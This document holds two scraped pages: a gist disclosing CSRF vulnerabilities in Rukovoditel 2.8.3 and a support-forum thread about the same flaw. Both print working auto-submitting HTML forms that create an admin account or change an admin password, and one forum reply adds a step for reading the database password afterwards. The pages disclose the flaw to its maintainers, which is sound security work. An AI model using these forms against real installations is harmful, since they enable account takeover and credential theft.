=== Content from gist.github.com_bd6806b4_20250114_191234.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@victomteng1997](https://avatars.githubusercontent.com/u/25191772?s=64&v=4)](/victomteng1997)

# [victomteng1997](/victomteng1997)/**[Rukovoditel\_CVE\_submission.md](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2)**

Last active
April 5, 2021 06:01

Show Gist options

* [Download ZIP](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2/archive/9ff52cdd22bd32a015cfd2e5de736344d60cb600.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/d5f2db1d37aed5792c28685068ec41e2.js&quot;&gt;&lt;/script&gt;
* Save victomteng1997/d5f2db1d37aed5792c28685068ec41e2 to your computer and use it in GitHub Desktop.

[Code](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2)
[Revisions
3](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/d5f2db1d37aed5792c28685068ec41e2.js&quot;&gt;&lt;/script&gt;

Save victomteng1997/d5f2db1d37aed5792c28685068ec41e2 to your computer and use it in GitHub Desktop.

[Download ZIP](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2/archive/9ff52cdd22bd32a015cfd2e5de736344d60cb600.zip)

Two CSRF vulnerabilities identified at Rukovoditel Project Management App

 [Raw](/victomteng1997/d5f2db1d37aed5792c28685068ec41e2/raw/9ff52cdd22bd32a015cfd2e5de736344d60cb600/Rukovoditel_CVE_submission.md)

[**Rukovoditel\_CVE\_submission.md**](#file-rukovoditel_cve_submission-md)

The official github of the project is: <https://github.com/Rukovoditel/Rukovoditel>, but hasn't been updated for a long time.
The source code of the software can be downloaded at: <https://sourceforge.net/projects/rukovoditel/files/rukovoditel_2.8.3.zip/download>

Vulnerabilities description

1. Attacker may exploit the CSRF vulenrability to add user with admin privilege.
   Process:
   (1) Admin login to his own account with correct credential.
   (2) The advesary crafts the following web page with an username "admin2" and password "admin2", and hosts it online.

```
<html>
<head>
<title>CSRF add admin user</title>
</head>

<body onload="javascript:fireForms()">
<script language="JavaScript">

function fireForms()
{
	var count = 2;
	var i=0;

	for(i=0; i<count; i++)
	{
    	document.forms[i].submit();
	}
}
</script>
<H2>Cross Site Request Forgery</H2>
<form method="POST" name="form1" action="http://localhost/rukovoditel/index.php?module=users/validate_form">
<input type="hidden" name="username" value="admin"/>
<input type="hidden" name="useremail" value="admin@admin.com"/>
</form>
<form method="POST" name="form0" action="http://localhost/rukovoditel/index.php?module=items/&action=save">
<input type="hidden" name="path" value="1"/>
<input type="hidden" name="redirect_to" value=""/>
<input type="hidden" name="parent_item_id" value="0"/>
<input type="hidden" name="fields[5]" value="1"/>
<input type="hidden" name="fields[14]" value="default"/>
<input type="hidden" name="fields[6]" value="0"/>
<input type="hidden" name="fields[12]" value="admin2"/>
<input type="hidden" name="password" value="admin2"/>
<input type="hidden" name="fields[7]" value="admin2"/>
<input type="hidden" name="fields[8]" value="lastname"/>
<input type="hidden" name="fields[10]" value="lastname"/>
<input type="hidden" name="fields[9]" value="admin2@admin.com"/>
<input type="hidden" name="fields[13]" value="english.php"/>
</form>
</body>
</html>

```

(3) Once the admin visit such website, he will create a new user with username "admin2" and password "admin2".

2. Attacker may exploit the CSRF vulenrability to change admin password.
   Process:
   (1) Admin login to his own account with correct credential.
   (2) The advesary crafts the following web page with a new password ("newpassword"), and hosts it online.

```
<html>
<head>
<title>CSRF change password</title>
</head>
<body onload="javascript:fireForms()">
<script language="JavaScript">
function fireForms()
{
	var count = 1;
	var i=0;

	for(i=0; i<count; i++)
	{
    	document.forms[i].submit();
	}
}
</script>
<H2>Cross Site Request Forgery (Edit Existing Admin details)</H2>
<form method="POST" name="form0" action="http://localhost/rukovoditel/index.php?module=users/change_password&action=change">
<input type="hidden" name="password_new" value="newpassword"/>
<input type="hidden" name="password_confirmation" value="newpassword"/>
</form>
</body>
</html>

```

(3) For anyone (including admin) who logged in to the account and visited this website, his credential will be changed to new password ("newpassword").

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fd5f2db1d37aed5792c28685068ec41e2)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from forum.rukovoditel.net_c3da099a_20250114_191232.html ===


# Rukovoditel Support Forum

Discussion, bug reports and help!

[Skip to content](#start_here)

Search

[Advanced search](./search.php?sid=18d2be2ec933006faf74428709bfa176 "Advanced search")

* Quick links

  + [Unanswered topics](./search.php?search_id=unanswered&sid=18d2be2ec933006faf74428709bfa176)
  + [Active topics](./search.php?search_id=active_topics&sid=18d2be2ec933006faf74428709bfa176)
  + [Search](./search.php?sid=18d2be2ec933006faf74428709bfa176)
* [FAQ](/app.php/help/faq?sid=18d2be2ec933006faf74428709bfa176 "Frequently Asked Questions")
* [Login](./ucp.php?mode=login&redirect=viewtopic.php%3Ff%3D19%26t%3D2760&sid=18d2be2ec933006faf74428709bfa176 "Login")
* [Register](./ucp.php?mode=register&sid=18d2be2ec933006faf74428709bfa176)

* [About Rukovoditel](https://www.rukovoditel.net)
  [Forum](./index.php?sid=18d2be2ec933006faf74428709bfa176)
  [Bug Report](./viewforum.php?f=6&sid=18d2be2ec933006faf74428709bfa176)
  [Previous versions](./viewforum.php?f=11&sid=18d2be2ec933006faf74428709bfa176)
  [Bug Report version 2.8](./viewforum.php?f=19&sid=18d2be2ec933006faf74428709bfa176)
* [Search](./search.php?sid=18d2be2ec933006faf74428709bfa176 "View the advanced search options")

## [CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176)

[Post Reply](./posting.php?mode=reply&t=2760&sid=18d2be2ec933006faf74428709bfa176 "Post a reply")

* [Print view](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&view=print "Print view")

Search

[Advanced search](./search.php?sid=18d2be2ec933006faf74428709bfa176 "Advanced search")

13 posts

* 1
* [2](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&start=10)
* [Next](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&start=10)

[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [12](./search.php?author_id=733&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 09:40
**Name:** Tuong Ngo Cat
**Location:** Ha Noi
**Company Name:** None

### [CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11177&sid=18d2be2ec933006faf74428709bfa176#p11177)

* [Quote](./posting.php?mode=quote&p=11177&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11177&sid=18d2be2ec933006faf74428709bfa176#p11177 "Post")
by **[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)** » 10 Mar 2021, 11:59

**CSRF vulnerability on Rukovoditel 2.8.3**

**## Bug Description**

Hi. I found a CSRF in the module add new user in Rukovoditel 2.8.3. Hacker can add new user with admin privilege.

**## How to Reproduce**

Steps to reproduce the behavior:

**1. Create a CSRF POC using the following code.**

Code: Select all

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
<title>Cross Site Request Forgery</title>
</head>

<body onload="javascript:fireForms()">
<script language="JavaScript">

function fireForms()
{
    var count = 2;
    var i=0;

    for(i=0; i<count; i++)
    {
        document.forms[i].submit();
    }
}

</script>

<H2>Cross Site Request Forgery</H2>

<form method="POST" name="form1" action="http://localhost//rukovoditel_2.8.3/index.php?module=users/validate_form">
<input type="hidden" name="username" value="admin1"/>
<input type="hidden" name="useremail" value="admin1@admin.com"/>

</form>

<form method="POST" name="form0" action="http://localhost//rukovoditel_2.8.3/index.php?module=items/&action=save">
<input type="hidden" name="path" value="1"/>
<input type="hidden" name="redirect_to" value=""/>
<input type="hidden" name="parent_item_id" value="0"/>
<input type="hidden" name="fields[5]" value="1"/>
<input type="hidden" name="fields[14]" value="default"/>
<input type="hidden" name="fields[6]" value="0"/>
<input type="hidden" name="fields[12]" value="admin1"/>
<input type="hidden" name="password" value="admin1pass"/>
<input type="hidden" name="fields[7]" value="admin1pass"/>
<input type="hidden" name="fields[8]" value="Name is Nothing"/>
<input type="hidden" name="fields[10]" value=""/>
<input type="hidden" name="fields[9]" value="admin1@admin.com"/>
<input type="hidden" name="fields[13]" value="english.php"/>

</form>
</form>

</body>
</html>

```

 **2. Replace the URI to path to Rukovoditel 2.8.3 folder and change password field.

3. Send the link script to the victim (admin) to make them click.

4. Login with new user.**

**## Server Information**

Xampp on Windows 10

**### PHP Operating System**

Windows NT DESKTOP-BDPIT37 10.0 build 18363 (Windows 10) AMD64

**### PHP Version**

PHP Version 7.4.15
Last edited by [TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176) on 12 Mar 2021, 07:48, edited 1 time in total.

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=681_1605181515.png)](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)
[marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [29](./search.php?author_id=681&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 31 Aug 2020, 13:28
**Name:** Albro
**Location:** Italia
**Company Name:** Alacer Sas
**Contact:**
Contact marajah

[Website](https://www.alacer.it "Website")

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11187&sid=18d2be2ec933006faf74428709bfa176#p11187)

* [Quote](./posting.php?mode=quote&p=11187&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11187&sid=18d2be2ec933006faf74428709bfa176#p11187 "Post")
by **[marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 04:03

Hi, Tuong

It works, but in my case I had to put the php file with the malicious code in the same server. Also, it worked when the connection was on the same protocol (HTTPS).

This means that (in my case, with my server configuration and the Samesite property of my cookies set on true) it is harder to achieve, but not too much. It can be done by someone having writing permission on a public folder, or by a user uploading a file with the php content included.

But in many other installation it could be a more serious problem, I guess; especially where guest users are allowed to register and upload files.

The only thing you have to do is to make someone with the permissions to create users opening the malicious page, while connected.

At the end you will have a new admin user, ready to be used to login without nobody knowing it.

@support

I'm not skilled enough to figure out how to solve, but maybe a token could help to protect the session (considering that it cannot be put in the malicious form)?

[Top](#top "Top")

[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [12](./search.php?author_id=733&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 09:40
**Name:** Tuong Ngo Cat
**Location:** Ha Noi
**Company Name:** None

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11189&sid=18d2be2ec933006faf74428709bfa176#p11189)

* [Quote](./posting.php?mode=quote&p=11189&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11189&sid=18d2be2ec933006faf74428709bfa176#p11189 "Post")
by **[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 07:20

> [marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176) wrote: [↑](./viewtopic.php?p=11187&sid=18d2be2ec933006faf74428709bfa176#p11187)11 Mar 2021, 04:03
> Hi, Tuong
>
>
>
> It works, but in my case I had to put the php file with the malicious code in the same server. Also, it worked when the connection was on the same protocol (HTTPS).
>
>
>
> This means that (in my case, with my server configuration and the Samesite property of my cookies set on true) it is harder to achieve, but not too much. It can be done by someone having writing permission on a public folder, or by a user uploading a file with the php content included.
>
> But in many other installation it could be a more serious problem, I guess; especially where guest users are allowed to register and upload files.
>
> The only thing you have to do is to make someone with the permissions to create users opening the malicious page, while connected.
>
> At the end you will have a new admin user, ready to be used to login without nobody knowing it.
>
>
>
> @support
>
> I'm not skilled enough to figure out how to solve, but maybe a token could help to protect the session (considering that it cannot be put in the malicious form)?

Yes, in this case, we need admin have session cookie click the link.

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=2_1441180972.png)](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)
[support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)
Site Admin
**Posts:** [6441](./search.php?author_id=2&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Oct 2014, 18:22
**Name:** Sergey Kharchishin
**Location:** Russia, Evpatoriya

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11196&sid=18d2be2ec933006faf74428709bfa176#p11196)

* [Quote](./posting.php?mode=quote&p=11196&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11196&sid=18d2be2ec933006faf74428709bfa176#p11196 "Post")
by **[support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 21:21

Again you are tesing with localhost and Xampp. By default session are the same for all localhost folders that is why you can send request form html form if there is logged users in <http://localhost//rukovoditel_2.8.3/>

But in live server you can't do it.

[Top](#top "Top")

[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [12](./search.php?author_id=733&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 09:40
**Name:** Tuong Ngo Cat
**Location:** Ha Noi
**Company Name:** None

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11200&sid=18d2be2ec933006faf74428709bfa176#p11200)

* [Quote](./posting.php?mode=quote&p=11200&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11200&sid=18d2be2ec933006faf74428709bfa176#p11200 "Post")
by **[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 21:56

> [support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176) wrote: [↑](./viewtopic.php?p=11196&sid=18d2be2ec933006faf74428709bfa176#p11196)11 Mar 2021, 21:21
> Again you are tesing with localhost and Xampp. By default session are the same for all localhost folders that is why you can send request form html form if there is logged users in <http://localhost//rukovoditel_2.8.3/>
>
> But in live server you can't do it.

In live server, I just need ADMIN click to my link and go to my website, method POST will be trigger.

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=2_1441180972.png)](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)
[support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)
Site Admin
**Posts:** [6441](./search.php?author_id=2&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Oct 2014, 18:22
**Name:** Sergey Kharchishin
**Location:** Russia, Evpatoriya

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11202&sid=18d2be2ec933006faf74428709bfa176#p11202)

* [Quote](./posting.php?mode=quote&p=11202&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11202&sid=18d2be2ec933006faf74428709bfa176#p11202 "Post")
by **[support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 21:57

You can't do any action if you are not logged. So any html files like this will redirect to login.

[Top](#top "Top")

[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [12](./search.php?author_id=733&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 09:40
**Name:** Tuong Ngo Cat
**Location:** Ha Noi
**Company Name:** None

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11204&sid=18d2be2ec933006faf74428709bfa176#p11204)

* [Quote](./posting.php?mode=quote&p=11204&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11204&sid=18d2be2ec933006faf74428709bfa176#p11204 "Post")
by **[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)** » 11 Mar 2021, 22:08

Yes, if user has been logged in?

[Top](#top "Top")

[![User avatar](./download/file.php?avatar=681_1605181515.png)](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)
[marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [29](./search.php?author_id=681&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 31 Aug 2020, 13:28
**Name:** Albro
**Location:** Italia
**Company Name:** Alacer Sas
**Contact:**
Contact marajah

[Website](https://www.alacer.it "Website")

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11205&sid=18d2be2ec933006faf74428709bfa176#p11205)

* [Quote](./posting.php?mode=quote&p=11205&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11205&sid=18d2be2ec933006faf74428709bfa176#p11205 "Post")
by **[marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176)** » 12 Mar 2021, 00:50

> [support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176) wrote: [↑](./viewtopic.php?p=11202&sid=18d2be2ec933006faf74428709bfa176#p11202)11 Mar 2021, 21:57
> You can't do any action if you are not logged. So any html files like this will redirect to login.

It's not the attacker that needs to be logged, but the victim. When the victim is logged and click on the page, the actions will be done on behalf of the victim

[https://en.wikipedia.org/wiki/Cross-sit ... st\_forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

There are some public database of the exploits of this and other types that could be directed to Rukovoditel. Probably they are not crazily dangerous, but I'm not skilled enough to say

<https://packetstormsecurity.com/search/?q=rukovoditel>

<https://www.exploit-db.com/>

[https://www.cvedetails.com/product/5413 ... r\_id=19833](https://www.cvedetails.com/product/54133/Rukovoditel-Rukovoditel.html?vendor_id=19833)

[Top](#top "Top")

[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [12](./search.php?author_id=733&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 09:40
**Name:** Tuong Ngo Cat
**Location:** Ha Noi
**Company Name:** None

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11206&sid=18d2be2ec933006faf74428709bfa176#p11206)

* [Quote](./posting.php?mode=quote&p=11206&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11206&sid=18d2be2ec933006faf74428709bfa176#p11206 "Post")
by **[TuongNC](./memberlist.php?mode=viewprofile&u=733&sid=18d2be2ec933006faf74428709bfa176)** » 12 Mar 2021, 07:40

> [marajah](./memberlist.php?mode=viewprofile&u=681&sid=18d2be2ec933006faf74428709bfa176) wrote: [↑](./viewtopic.php?p=11205&sid=18d2be2ec933006faf74428709bfa176#p11205)12 Mar 2021, 00:50
> > [support](./memberlist.php?mode=viewprofile&u=2&sid=18d2be2ec933006faf74428709bfa176) wrote: [↑](./viewtopic.php?p=11202&sid=18d2be2ec933006faf74428709bfa176#p11202)11 Mar 2021, 21:57
> > You can't do any action if you are not logged. So any html files like this will redirect to login.
>
> It's not the attacker that needs to be logged, but the victim. When the victim is logged and click on the page, the actions will be done on behalf of the victim
>
> [https://en.wikipedia.org/wiki/Cross-sit ... st\_forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)
>
> There are some public database of the exploits of this and other types that could be directed to Rukovoditel. Probably they are not crazily dangerous, but I'm not skilled enough to say
>
> <https://packetstormsecurity.com/search/?q=rukovoditel>
>
> <https://www.exploit-db.com/>
>
> [https://www.cvedetails.com/product/5413 ... r\_id=19833](https://www.cvedetails.com/product/54133/Rukovoditel-Rukovoditel.html?vendor_id=19833)

Nice comment <3

[Top](#top "Top")

[swar](./memberlist.php?mode=viewprofile&u=732&sid=18d2be2ec933006faf74428709bfa176)
**Posts:** [60](./search.php?author_id=732&sr=posts&sid=18d2be2ec933006faf74428709bfa176) **Joined:** 19 Dec 2020, 04:11
**Name:** A.R.
**Location:** Bratislava

### [Re: CSRF vulnerability on Rukovoditel 2.8.3 Hacker can add new user with admin privilege](./viewtopic.php?p=11218&sid=18d2be2ec933006faf74428709bfa176#p11218)

* [Quote](./posting.php?mode=quote&p=11218&sid=18d2be2ec933006faf74428709bfa176 "Reply with quote")

[Post](./viewtopic.php?p=11218&sid=18d2be2ec933006faf74428709bfa176#p11218 "Post")
by **[swar](./memberlist.php?mode=viewprofile&u=732&sid=18d2be2ec933006faf74428709bfa176)** » 13 Mar 2021, 03:44

This looks like a critical security bug requiring an immediate patch. Typical basic CSRF vulnerability.

It does not matter that attacker is not logged in, the problem is that attacker can easily achieve that the script is activated by a logged-in user, e.g. by sending the admin a link to a malicious page by e-mail. If the admin clicks the link, the attacker has succeeded.

Even worse is that it seems to me (I have not tested it) that Rukovoditel is not protected against CSFRs at all. If so, any available actions could be activated by an attacker using this technique, everything you can imagine. Adding new entries, adding new fields, deleting entities, changing admin's email and password ... countless options.

@TuongNC Did you have a chance to tests other forms in the app?

@support Please fix this asap. Also, please confirm that there are measures against CSFR in the Rukovoditel and there are no other forms with this vulnerability.

Edit: Vulnerability is real, I just successfully reproduced this. No need for the same domain, it works even if the code is somewhere else. Malicious script on localhost hacked my rukovoditel 2.8.3 running on professional webhosting with SSL. With this, the attacker will gain access to the admin's account. Then he can simply create field type PHPFormula in any entity, input code

Code: Select all

```
echo DB_SERVER_PASSWORD;
```
 and then he has also you db password. ![:(](./images/smilies/icon_e_sad.gif "Sad")

[Top](#top "Top")

[Post Reply](./posting.php?mode=reply&t=2760&sid=18d2be2ec933006faf74428709bfa176 "Post a reply")

* [Print view](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&view=print "Print view")

Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
Sort by: AuthorPost timeSubject
Direction: AscendingDescending

---

13 posts

* 1
* [2](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&start=10)
* [Next](./viewtopic.php?t=2760&sid=18d2be2ec933006faf74428709bfa176&start=10)

[Return to “Bug Report version 2.8”](./viewforum.php?f=19&sid=18d2be2ec933006faf74428709bfa176)

Jump to

* [Discussion](./viewforum.php?f=2&sid=18d2be2ec933006faf74428709bfa176)
* [Suggestions](./viewforum.php?f=3&sid=18d2be2ec933006faf74428709bfa176)
* [Plugins](./viewforum.php?f=26&sid=18d2be2ec933006faf74428709bfa176)
* [Translations](./viewforum.php?f=5&sid=18d2be2ec933006faf74428709bfa176)
* [Bug Report](./viewforum.php?f=6&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.6.1](./viewforum.php?f=28&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Previous versions](./viewforum.php?f=11&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.4](./viewforum.php?f=15&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.3](./viewforum.php?f=14&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.2](./viewforum.php?f=13&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.1](./viewforum.php?f=12&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.0](./viewforum.php?f=10&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 1.9](./viewforum.php?f=9&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 1.8](./viewforum.php?f=8&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 1.7](./viewforum.php?f=7&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 1.6 (or older)](./viewforum.php?f=4&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.5](./viewforum.php?f=16&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.6](./viewforum.php?f=17&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.7](./viewforum.php?f=18&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.8](./viewforum.php?f=19&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 2.9](./viewforum.php?f=20&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.0](./viewforum.php?f=21&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.1](./viewforum.php?f=22&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.2](./viewforum.php?f=23&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.3](./viewforum.php?f=24&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.4.4](./viewforum.php?f=25&sid=18d2be2ec933006faf74428709bfa176)
* [↳   Bug Report version 3.5.4](./viewforum.php?f=27&sid=18d2be2ec933006faf74428709bfa176)

* [About Rukovoditel](https://www.rukovoditel.net) [Forum](./index.php?sid=18d2be2ec933006faf74428709bfa176)
* All times are UTC+04:00
* [Delete cookies](./ucp.php?mode=delete_cookies&sid=18d2be2ec933006faf74428709bfa176)

Powered by [phpBB](https://www.phpbb.com/)® Forum Software © phpBB Limited

[Privacy](./ucp.php?mode=privacy&sid=18d2be2ec933006faf74428709bfa176 "Privacy")
|
[Terms](./ucp.php?mode=terms&sid=18d2be2ec933006faf74428709bfa176 "Terms")

###

![](/app.php/cron/cron.task.core.tidy_cache?sid=18d2be2ec933006faf74428709bfa176)

 ![](https://mc.yandex.ru/watch/57675358)


